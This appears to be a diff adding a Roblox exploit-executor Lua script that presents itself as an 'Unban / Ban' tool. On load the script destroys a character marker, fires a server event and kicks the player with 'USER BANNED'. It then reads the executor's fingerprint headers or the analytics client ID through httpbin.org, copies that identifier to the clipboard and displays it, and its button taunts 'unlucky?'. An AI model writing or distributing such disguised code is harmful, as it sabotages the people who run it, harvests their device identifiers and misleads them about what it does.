@@ -1,0 +1,136 @@
+lp = game:GetService("Players").LocalPlayer
+local getcorrupt = Instance.new("ScreenGui")
+local Frame = Instance.new("ImageLabel")
+local Frame_2 = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local TextBox = Instance.new("TextBox")
+local Frame_3 = Instance.new("ImageLabel")
+lp.Character:FindFirstChild('FULLY_LOADED_CHAR'):Destroy()
+game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
+game.Players.LocalPlayer:Kick("USER BANNED")
+wait(0.5)
+getcorrupt.Name = "getcorruptbyvux"
+getcorrupt.Parent = game.CoreGui
+
+Frame.Name = "Frame"
+Frame.Parent = getcorrupt
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BackgroundTransparency = 1.000
+Frame.Position = UDim2.new(0.18433179, 0, 0.17766498, 0)
+Frame.Size = UDim2.new(0.630414724, 0, 0.620981395, 0)
+Frame.Image = "rbxassetid://3570695787"
+Frame.ImageColor3 = Color3.fromRGB(66, 66, 66)
+Frame.ScaleType = Enum.ScaleType.Slice
+Frame.SliceCenter = Rect.new(100, 100, 100, 100)
+Frame.SliceScale = 0.120
+Frame.Draggable = true
+Frame_2.Parent = Frame
+Frame_2.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
+Frame_2.BorderSizePixel = 0
+Frame_2.Position = UDim2.new(0.199760765, 0, 0.201174319, 0)
+Frame_2.Size = UDim2.new(0.599415183, 0, 0.027247956, 0)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.358334541, 0, 0.0563076138, 0)
+TextLabel.Size = UDim2.new(0.282163739, 0, 0.117166214, 0)
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.Text = "Unban / Ban"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
+TextButton.Position = UDim2.new(0.343456686, 0, 0.80565542, 0)
+TextButton.Size = UDim2.new(0.312865496, 0, 0.108991824, 0)
+TextButton.AutoButtonColor = false
+TextButton.Font = Enum.Font.GothamBold
+TextButton.Text = "UNBAN"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
+TextBox.BorderColor3 = Color3.fromRGB(83, 83, 83)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0.0147427563, 0, 0.352484167, 0)
+TextBox.Size = UDim2.new(0.967836261, 0, 0.29155314, 0)
+TextBox.ClearTextOnFocus = false
+TextBox.Font = Enum.Font.SourceSansBold
+TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.PlaceholderText = ""
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextScaled = true
+TextBox.TextSize = 14.000
+TextBox.TextWrapped = true
+
+Frame_3.Name = "Frame"
+Frame_3.Parent = getcorrupt
+Frame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_3.BackgroundTransparency = 1.000
+Frame_3.Position = UDim2.new(0.18433179, 0, 0.200812116, 0)
+Frame_3.Size = UDim2.new(0.630414724, 0, 0.620981395, 0)
+Frame_3.ZIndex = 0
+Frame_3.Image = "rbxassetid://3570695787"
+Frame_3.ImageColor3 = Color3.fromRGB(45, 45, 45)
+Frame_3.ScaleType = Enum.ScaleType.Slice
+Frame_3.SliceCenter = Rect.new(100, 100, 100, 100)
+Frame_3.SliceScale = 0.120
+
+local http_request = http_request or request or syn.request;
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local ip_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+local corrupt = false;
+
+for i, v in next, ip_list do
+    if decoded.headers[v] then
+        corrupt = decoded.headers[v];
+        break
+    end
+end
+
+local a
+if corrupt then
+a = corrupt
+else
+a = game:GetService("RbxAnalyticsService"):GetClientId()
+end
+
+setclipboard(a)
+TextBox.Text = a
+
+TextButton.MouseButton1Click:Connect(function()
+
+local http_request = http_request or request or syn.request;
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local ip_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+local corrupt = false;
+
+for i, v in next, ip_list do
+    if decoded.headers[v] then
+        corrupt = decoded.headers[v];
+        break
+    end
+end
+
+local a
+if corrupt then
+a = corrupt
+else
+a = game:GetService("RbxAnalyticsService"):GetClientId()
+end
+
+setclipboard(a)
+TextBox.Text = a
+TextButton.Text = "unlucky?"
+end)
